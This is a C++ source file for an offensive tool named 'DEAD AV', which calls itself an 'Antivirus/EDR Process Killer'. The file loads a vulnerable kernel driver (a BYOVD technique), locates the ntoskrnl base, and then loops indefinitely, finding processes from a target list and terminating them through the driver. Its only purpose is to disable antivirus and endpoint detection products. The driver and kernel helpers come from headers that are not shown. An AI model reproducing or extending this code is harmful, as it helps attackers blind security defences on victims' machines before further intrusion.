#include <iostream>
#include <vector>
#include <string>
#include <thread>
#include <chrono>
#include <csignal>
#include <algorithm>
#include <cctype>
#include <cstdlib>
#include "byovd.h"
#include "kernel.h"
#include "utils.h"

#ifdef min
#undef min
#endif

volatile bool g_running = true;
volatile bool g_user_exit = false;

void SignalHandler(int signal) {
    if (signal == SIGINT) {
        std::cout << "\n[!] Ctrl+C detected - shutting down..." << std::endl;
        g_running = false;
        g_user_exit = true;
    }
}

void PrintSimpleBanner() {
    std::cout << "\n";
    std::cout << "==============================================\n";
    std::cout << "                  DEAD AV                     \n";
    std::cout << "        Antivirus/EDR Process Killer          \n";
    std::cout << "==============================================\n";
    std::cout << "\n";
}

int main() {
    // bad
    system("chcp 65001 > nul 2>&1");
    
    PrintSimpleBanner();
    
    // signal handler
    std::signal(SIGINT, SignalHandler);
    
    std::cout << "[*] Initializing DEAD AV..." << std::endl;
    std::this_thread::sleep_for(std::chrono::seconds(2));
    
    auto config = BYOVD::GetBdApiUtilConfig();
    BYOVD driver(config);
    
    std::cout << "[*] Setting up vulnerable driver..." << std::endl;
    if (!driver.Initialize()) {
        std::cerr << "[-] Failed to initialize driver" << std::endl;
        std::cout << "\nPress Enter to exit...";
        std::cin.get();
        return 1;
    }
    
    std::cout << "[*] Starting driver service..." << std::endl;
    if (!driver.Start()) {
        std::cerr << "[-] Failed to start driver" << std::endl;
        std::cout << "\nPress Enter to exit...";
        std::cin.get();
        return 1;
    }
    
    std::cout << "[+] Driver loaded successfully!" << std::endl;
    
    // get kernel base address
    std::cout << "[*] Enumerating kernel modules..." << std::endl;
    ULONG_PTR ntoskrnlBase = GetKernelModuleBase("ntoskrnl.exe");
    if (ntoskrnlBase != 0) {
        std::cout << "[+] ntoskrnl.exe base address: 0x" << std::hex << ntoskrnlBase << std::dec << std::endl;
    } else {
        std::cout << "[-] Failed to get ntoskrnl.exe base address" << std::endl;
    }
    
    // get target processes 
    std::cout << "[*] Loading target process list..." << std::endl;
    auto targetProcesses = GetTargetProcesses();
    std::cout << "[+] Loaded " << targetProcesses.size() << " target processes" << std::endl;
    
    std::cout << "\n[*] Starting continuous monitoring..." << std::endl;
    std::cout << "[!] Press Ctrl+C to stop" << std::endl;
    std::cout << "[!] This will run FOREVER until you stop it manually\n" << std::endl;
    
    int checkCount = 0;
    int totalKilled = 0;
    
    while (g_running) {
        checkCount++;
        std::cout << "[-] Scan #" << checkCount << " - checking " << targetProcesses.size() << " processes..." << std::endl;
        
        int killedThisRound = 0;
        
        const size_t BATCH_SIZE = 50;
        
        for (size_t i = 0; i < targetProcesses.size() && g_running; i += BATCH_SIZE) {
            size_t end = std::min(i + BATCH_SIZE, targetProcesses.size());
            
            for (size_t j = i; j < end && g_running; j++) {
                const auto& processName = targetProcesses[j];
                
                DWORD pid = GetProcessIdByName(processName);
                if (pid != 0) {
                    std::cout << "[!] Found " << processName << " (PID: " << pid << ")" << std::endl;
                    
                    if (driver.KillProcess(pid)) {
                        std::cout << "[+] Successfully terminated " << processName << " (PID: " << pid << ")" << std::endl;
                        killedThisRound++;
                        totalKilled++;
                    } else {
                        std::cout << "[-] Failed to kill " << processName << " (PID: " << pid << ")" << std::endl;
                    }
                    
                    std::this_thread::sleep_for(std::chrono::milliseconds(10));
                }
            }
            
            if (i + BATCH_SIZE < targetProcesses.size() && g_running) {
                std::this_thread::sleep_for(std::chrono::milliseconds(100));
            }
        }
        
        if (killedThisRound == 0) {
            std::cout << "[-] No target processes found in this scan" << std::endl;
        } else {
            std::cout << "[+] Terminated " << killedThisRound << " processes this round (Total: " << totalKilled << ")" << std::endl;
        }
        
        std::cout << "[*] Waiting 3 seconds before next scan..." << std::endl;
        for (int i = 0; i < 30 && g_running; i++) {
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
        
        if (checkCount % 10 == 0) {
            std::cout << "[*] Cleaning up memory (scan #" << checkCount << ")..." << std::endl;
            std::this_thread::sleep_for(std::chrono::milliseconds(500));
        }
    }
    
    std::cout << "\n[*] User requested shutdown..." << std::endl;
    std::cout << "[*] Cleaning up..." << std::endl;
    
    if (!driver.Stop()) {
        std::cout << "[-] Failed to stop driver" << std::endl;
    } else {
        std::cout << "[+] Driver stopped successfully" << std::endl;
    }
    
    std::cout << "\n[*] Total processes terminated: " << totalKilled << std::endl;
    std::cout << "[*] DEAD AV finished. Thanks for using!" << std::endl;
    
    if (!g_user_exit) {
        std::cout << "\nPress Enter to exit...";
        std::cin.get();
    }
    
    return 0;
}